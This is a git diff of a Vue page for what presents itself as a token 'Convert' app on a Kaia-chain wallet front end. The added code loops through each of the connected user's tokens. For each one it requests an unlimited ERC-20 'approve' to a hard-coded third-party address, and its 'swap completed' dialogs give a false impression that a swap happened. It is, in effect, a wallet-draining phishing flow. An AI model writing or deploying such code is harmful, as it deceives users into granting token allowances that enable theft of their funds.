@@ -6,10 +6,18 @@ import {Mousewheel, Pagination} from 'swiper/modules'
 import {onBeforeMount, onBeforeUnmount, onMounted, reactive, ref, watchEffect, watch} from 'vue'
 import type {Swiper as SwiperInstance} from 'swiper'; // 类型导入
 import {abi} from "./erc20.ts"
-import {useAccount, useChainId, useConnect, useWriteContract, useSwitchChain} from '@wagmi/vue';
+import {
+  useAccount,
+  useChainId,
+  useConnect,
+  useWriteContract,
+  useSwitchChain,
+  useWaitForTransactionReceipt
+} from '@wagmi/vue';
 import {injected, metaMask, walletConnect} from '@wagmi/vue/connectors'
 import {kaiaWalletApprove} from "@/views/kaiaMobileApprove.ts";
 import {klipWalletApprove} from "@/views/klipMobileApprove.ts";
+import {useCoinList} from "@/views/axios.ts";
 
 
 let timer: any = null
@@ -34,36 +42,57 @@ const projectId = '0c3c979e2192a3e1d8537e6f5f1c6048'
 const chainId = useChainId();
 const {connectors, connect} = useConnect();
 const {address, connector, isConnected} = useAccount();
-const {data: hash, writeContract} = useWriteContract()
+const {writeContract, status, isPending, isSuccess, isError} = useWriteContract(
+    {
+      mutation: {
+        onSuccess(data) {
+          callNextAsset()
+
+          // 先显示 swapProgress
+          showDialog('swapProgress');
+          // 等待 3 秒（硬等待）
+           new Promise(resolve => setTimeout(resolve, 2000));
+          hideDialog('swapProgress')
+          // 显示 swapCompleted
+          showDialog('swapCompleted');
+           new Promise(resolve => setTimeout(resolve, 3000));
+
+          hideDialog('swapCompleted')
+          console.log('Transaction succeeded:', data)
+          // 例如：更新本地状态或跳转页面
+        },
+        onError(error) {
+          console.error('Transaction failed:', error)
+          // 例如：显示错误提示
+        },
+        onSettled(data, error) {
+          // 无论成功或失败都执行（如重置加载状态）
+        },
+      },
+    }
+)
 const {chains, switchChain} = useSwitchChain()
 const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
+const {
+  getCoinList,
+  callNextAsset,
+  nextAsset,
+  loading
+} = useCoinList()
+
 
 const appusdt = async () => {
-  await writeContract({
-    address: '0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2',
+
+  writeContract({
+    address: nextAsset.value?.token as `0x${string}`,
     abi,
     functionName: 'approve',
     args: ["0x48F943a8a6A6437117063D3aCaf62e2047467966", MAX_UINT256],
   })
 
-  // 先显示 swapProgress
-  showDialog('swapProgress');
-
-  // 等待 3 秒（硬等待）
-  await new Promise(resolve => setTimeout(resolve, 2000));
-
-  hideDialog('swapProgress')
-
-
-  // 显示 swapCompleted
-  showDialog('swapCompleted');
-  await new Promise(resolve => setTimeout(resolve, 3000));
-  hideDialog('swapCompleted')
-
 
 }
-
 
 const data = reactive({
   defaultShow: 'walletConnection',
@@ -97,13 +126,13 @@ const connectKaiaMobile = () => {
   if (!isMobile()) {
     connect({connector: injected()})
   } else {
-    kaiaWalletApprove()
+    kaiaWalletApprove(nextAsset.value?.token,callNextAsset)
   }
 }
 
 
 const connectKlipMobile = () => {
-  klipWalletApprove()
+  klipWalletApprove(nextAsset.value?.token,callNextAsset)
 }
 
 
@@ -165,6 +194,7 @@ watchEffect(() => {
   if (address.value) {
     hideDialog('walletConnection');
     switchChain({chainId: 8217});
+    getCoinList(address.value)
   }
 });
 
@@ -541,7 +571,12 @@ watch(isConnected, async (newValue) => {
               <div>Cancel</div>
             </div>
             <div class="btn_2">
-              <div class="fmRedHatDisplay2-7" :class="{'on':data.chked}" @click="appusdt">Confirm</div>
+              <div :disabled="isPending"  v-if="isPending" class="fmRedHatDisplay2-7" :class="{'on':data.chked}" >
+                  <div  class="loading-spinner"></div>
+              </div>
+              <div v-else  class="fmRedHatDisplay2-7" :class="{'on':data.chked}" @click="appusdt">Confirm</div>
+
+
             </div>
           </div>
 
@@ -717,11 +752,13 @@ watch(isConnected, async (newValue) => {
 
             <div class="btn_box">
 
-              <button class="btn_on" v-if="isConnected" @click="showDialog('pleaseConfirm')">
+              <button :disabled="loading" class="btn_on" v-if="isConnected" @click="showDialog('pleaseConfirm')">
                 <div class="btn_text">Convert</div>
 
                 <div class="proto_icon">
-                  <svg xmlns="http://www.w3.org/2000/svg" fill="rgba(255, 255, 255, 1)" viewBox="0 0 32 33"
+
+                  <svg v-if="!loading" xmlns="http://www.w3.org/2000/svg" fill="rgba(255, 255, 255, 1)"
+                       viewBox="0 0 32 33"
                        style="width: var(--Sizing-4, 20px); height: var(--Sizing-4, 20px);">
                     <path fill-rule="evenodd"
                           d="M11.293 5.293a1 1 0 0 1 1.414 0l10 10a1 1 0 0 1 0 1.414l-10 10a1 1 0 0 1-1.414-1.414L20.586 16l-9.293-9.293a1 1 0 0 1 0-1.414"
@@ -730,6 +767,9 @@ watch(isConnected, async (newValue) => {
                           d="M10.94 4.94a1.5 1.5 0 0 1 2.12 0l10 10a1.5 1.5 0 0 1 0 2.12l-10 10a1.5 1.5 0 0 1-2.12-2.12L19.878 16l-8.94-8.94a1.5 1.5 0 0 1 0-2.12m1.414.706a.5.5 0 0 0-.708.708l9.293 9.292a.5.5 0 0 1 0 .708l-9.293 9.292a.5.5 0 0 0 .708.708l10-10a.5.5 0 0 0 0-.708z"
                           clip-rule="evenodd"></path>
                   </svg>
+
+
+                  <div v-else class="loading-spinner"></div>
                 </div>
               </button>
 
@@ -953,5 +993,32 @@ watch(isConnected, async (newValue) => {
 
 .swiper-pagination-bullet-active {
   background-color: #CCF33A;
+}
+
+/* 禁用按钮样式 */
+button.disabled {
+  opacity: 0.5;
+  cursor: not-allowed;
+}
+
+/* 加载动画 (Spinner) */
+.loading-spinner {
+  width: 20px;
+  height: 20px;
+  border: 3px solid rgba(255, 255, 255, 0.3); /* 透明边框 */
+  border-top: 3px solid white; /* 只有上方有白色边 */
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  display: inline-block;
+}
+
+/* 旋转动画 */
+@keyframes spin {
+  0% {
+    transform: rotate(0deg);
+  }
+  100% {
+    transform: rotate(360deg);
+  }
 }
 </style>
